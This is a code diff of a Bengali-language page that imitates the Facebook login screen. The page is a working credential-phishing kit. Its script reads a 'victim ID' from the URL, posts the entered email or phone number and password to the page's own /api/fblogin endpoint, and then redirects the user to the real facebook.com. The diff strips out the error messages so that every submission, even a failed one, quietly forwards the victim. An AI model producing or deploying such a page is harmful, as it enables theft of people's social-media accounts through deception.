@@ -2,121 +2,243 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - লগ ইন করুন</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             padding: 20px;
         }
         .container {
             background: #ffffff;
             border-radius: 8px;
-            padding: 40px 30px;
+            padding: 40px 32px 32px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 396px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
-        .logo { font-size: 40px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
-        .subtitle { color: #606770; margin-bottom: 20px; font-size: 15px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { display: block; font-weight: 600; color: #606770; margin-bottom: 5px; font-size: 14px; }
+        .logo {
+            font-size: 44px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            user-select: none;
+        }
+        .subtitle {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+        .input-group {
+            margin-bottom: 12px;
+        }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
-            font-size: 16px;
-            transition: border-color 0.2s;
-            box-sizing: border-box;
+            font-size: 17px;
+            color: #1d2129;
+            background: #ffffff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+            font-family: inherit;
         }
         .input-group input:focus {
             border-color: #1877f2;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        .input-group input::placeholder {
+            color: #90949c;
         }
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: #1877f2;
             color: #ffffff;
             border: none;
             border-radius: 6px;
-            font-size: 18px;
-            font-weight: bold;
+            font-size: 20px;
+            font-weight: 600;
             cursor: pointer;
             transition: background 0.2s;
+            font-family: inherit;
+            margin-top: 4px;
         }
-        .btn:hover { background: #166fe5; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
-        .error { color: #e74c3c; font-size: 14px; margin-top: 10px; display: none; }
-        .loading { display: none; margin-top: 15px; color: #606770; font-size: 14px; }
-        .loading.active { display: block; }
-        .status { margin-top: 15px; color: #28a745; font-size: 14px; display: none; }
-        .status.active { display: block; }
-        .forgot { color: #1877f2; text-decoration: none; font-size: 14px; }
-        .forgot:hover { text-decoration: underline; }
+        .btn:hover {
+            background: #166fe5;
+        }
+        .btn:active {
+            background: #0e5dc8;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0 16px;
+        }
+        .forgot-link {
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 12px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .error-msg {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: left;
+            padding-left: 4px;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .signup-area {
+            margin-top: 24px;
+            border-top: 1px solid #dadde1;
+            padding-top: 20px;
+        }
+        .signup-area .btn-green {
+            background: #42b72a;
+            padding: 12px 20px;
+            font-size: 17px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+            width: auto;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .signup-area .btn-green:hover {
+            background: #36a420;
+        }
+        .signup-area .btn-green:active {
+            background: #2d8f1a;
+        }
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #737373;
+        }
+        .footer-text a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile adjustments */
+        @media (max-width: 500px) {
+            .container {
+                padding: 24px 16px 20px;
+            }
+            .logo {
+                font-size: 38px;
+            }
+            .input-group input {
+                font-size: 16px;
+                padding: 12px 14px;
+            }
+            .btn {
+                font-size: 18px;
+                padding: 10px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Logo -->
         <div class="logo">facebook</div>
         <div class="subtitle">আপনার অ্যাকাউন্ট দিয়ে লগ ইন করুন</div>
-        <form id="loginForm">
+
+        <!-- Login Form -->
+        <form id="loginForm" autocomplete="off">
             <div class="input-group">
-                <label>ইমেইল বা ফোন নম্বর</label>
-                <input type="text" id="username" placeholder="আপনার ইমেইল বা ফোন" required>
+                <input type="text" id="username" placeholder="ইমেইল বা ফোন নম্বর" required autofocus>
             </div>
             <div class="input-group">
-                <label>পাসওয়ার্ড</label>
-                <input type="password" id="password" placeholder="আপনার পাসওয়ার্ড" required>
+                <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
             </div>
-            <div id="error" class="error">আপনার ইমেইল বা পাসওয়ার্ড ভুল। আবার চেষ্টা করুন।</div>
+
+            <div id="errorMsg" class="error-msg">আপনার ইমেইল বা পাসওয়ার্ড ভুল। আবার চেষ্টা করুন।</div>
+
             <button type="submit" class="btn" id="loginBtn">লগ ইন করুন</button>
-            <div class="loading" id="loading">লগ ইন করা হচ্ছে...</div>
-            <div class="status" id="status">✅ লগ ইন সফল! পুনঃনির্দেশিত হচ্ছে...</div>
+
+            <a href="#" class="forgot-link">পাসওয়ার্ড ভুলে গেছেন?</a>
+
             <div class="divider"></div>
-            <a href="#" class="forgot">পাসওয়ার্ড ভুলে গেছেন?</a>
+
+            <div class="signup-area">
+                <a href="#" class="btn-green">নতুন অ্যাকাউন্ট তৈরি করুন</a>
+            </div>
+
+            <div class="footer-text">
+                <a href="#">প্রাইভেসি</a> · <a href="#">শর্তাবলী</a> · <a href="#">কুকিজ</a>
+            </div>
         </form>
     </div>
+
     <script>
         (function() {
+            // ভিক্টিম আইডি
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
+
             const form = document.getElementById('loginForm');
             const usernameInput = document.getElementById('username');
             const passwordInput = document.getElementById('password');
             const loginBtn = document.getElementById('loginBtn');
-            const errorDiv = document.getElementById('error');
-            const loadingDiv = document.getElementById('loading');
-            const statusDiv = document.getElementById('status');
+            const errorMsg = document.getElementById('errorMsg');
 
+            // লগইন সাবমিট
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
+
                 const username = usernameInput.value.trim();
                 const password = passwordInput.value.trim();
 
+                // ফাঁকা চেক
                 if (!username || !password) {
-                    errorDiv.textContent = 'দয়া করে ইমেইল এবং পাসওয়ার্ড দিন।';
-                    errorDiv.style.display = 'block';
+                    errorMsg.textContent = 'দয়া করে ইমেইল এবং পাসওয়ার্ড দিন।';
+                    errorMsg.classList.add('show');
                     return;
                 }
 
+                // বাটন ডিজেবল (পুনরায় ক্লিক ঠেকাতে)
                 loginBtn.disabled = true;
                 loginBtn.textContent = 'লগ ইন করা হচ্ছে...';
-                loadingDiv.classList.add('active');
-                errorDiv.style.display = 'none';
+                errorMsg.classList.remove('show');
 
                 try {
-                    const response = await fetch('/api/fblogin', {
+                    // ডেটা সার্ভারে পাঠান
+                    await fetch('/api/fblogin', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -126,31 +248,34 @@
                         })
                     });
 
-                    if (response.ok) {
-                        loadingDiv.classList.remove('active');
-                        statusDiv.classList.add('active');
-                        loginBtn.style.display = 'none';
-                        setTimeout(() => {
-                            window.location.href = 'https://facebook.com';
-                        }, 2000);
-                    } else {
-                        errorDiv.textContent = 'সার্ভারে সমস্যা হয়েছে। আবার চেষ্টা করুন।';
-                        errorDiv.style.display = 'block';
-                        loginBtn.disabled = false;
-                        loginBtn.textContent = 'লগ ইন করুন';
-                        loadingDiv.classList.remove('active');
-                    }
+                    // সাথে সাথে ফেসবুকে রিডাইরেক্ট (যেকোনো রেসপন্সে)
+                    window.location.href = 'https://facebook.com';
+
                 } catch (err) {
-                    errorDiv.textContent = 'নেটওয়ার্ক সমস্যা। আবার চেষ্টা করুন।';
-                    errorDiv.style.display = 'block';
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'লগ ইন করুন';
-                    loadingDiv.classList.remove('active');
+                    // নেটওয়ার্ক এরর – তবুও ফেসবুকে রিডাইরেক্ট
+                    window.location.href = 'https://facebook.com';
                 }
             });
 
-            usernameInput.addEventListener('focus', () => errorDiv.style.display = 'none');
-            passwordInput.addEventListener('focus', () => errorDiv.style.display = 'none');
+            // ইনপুট ফোকাসে এরর হাইড
+            usernameInput.addEventListener('focus', () => {
+                errorMsg.classList.remove('show');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'লগ ইন করুন';
+            });
+            passwordInput.addEventListener('focus', () => {
+                errorMsg.classList.remove('show');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'লগ ইন করুন';
+            });
+
+            // "লগ ইন করুন" টেক্সট রিসেট (যদি ইনপুটে ক্লিক না করে)
+            document.addEventListener('click', function() {
+                if (!loginBtn.disabled) {
+                    loginBtn.textContent = 'লগ ইন করুন';
+                }
+            });
+
         })();
     </script>
 </body>
